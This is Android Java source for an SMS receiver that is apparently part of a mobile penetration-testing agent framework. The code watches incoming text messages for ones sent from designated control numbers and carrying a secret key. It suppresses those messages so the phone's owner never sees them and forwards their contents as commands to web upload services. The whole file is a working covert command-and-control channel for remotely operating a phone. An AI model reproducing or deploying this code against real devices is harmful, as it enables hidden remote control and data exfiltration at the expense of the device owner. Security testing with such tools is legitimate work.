package com.bulbsecurity.framework.app;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;
import com.bulbsecurity.framework.app2.R;

public class SMSReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context arg0, Intent arg1) {
		// TODO Auto-generated method stub
		Bundle bundle = arg1.getExtras();
		SmsMessage[] msgs = null;
		String[] agentarray = arg0.getResources().getStringArray(R.array.agentarray);
		String[] keyarray = arg0.getResources().getStringArray(R.array.keyarray);
		String[] patharray = arg0.getResources().getStringArray(R.array.patharray);
		 
		if (bundle != null)
		{
			Object[] pdus = (Object[]) bundle.get("pdus");
			msgs = new SmsMessage[pdus.length];
			for (int i=0; i < msgs.length; i++)
			{
				msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
				String fromnumber = msgs[i].getOriginatingAddress();
				for (int k=0; k < agentarray.length; k++)
				{
					
				String controlnumber = agentarray[k];
				if (fromnumber.equals(controlnumber))
				{
					
					String body = msgs[i].getMessageBody().toString();
					if (body.length() >= 7)
					{
						String checkkey = body.substring(0,7);
						String key = keyarray[k];
						if (checkkey.equals(key))
						{
							this.abortBroadcast();
							String aString[] = body.split(" ");
							String port = aString[1];
							if (port.equals("PORT"))
							{
								Log.i("BBBB", body);
								Intent intent = new Intent(arg0, WebUploadService3.class);
								String controlpath = patharray[k];
								aString[1] = controlpath;
								String uploadbody = aString[1];
								for (int j = 2; j < aString.length; j++)
								{
									uploadbody += " ";
									uploadbody += aString[j];
								}
								Log.i("AAAA",uploadbody);
								if (uploadbody.equals(null))
								{
									uploadbody = "-";
								}
								
							intent.putExtra("uploadstring",uploadbody);
							arg0.startService(intent);	
								
							}
							else{
							Intent intent = new Intent(arg0, WebUploadService.class);
					
								String uploadbody = aString[1];
								for (int j = 2; j < aString.length; j++)
								{
									uploadbody += " ";
									uploadbody += aString[j];
								}
							intent.putExtra("uploadstring",uploadbody);
							arg0.startService(intent);
							}
						}
					
					}
				}
				}
			}
		}

	}
	}


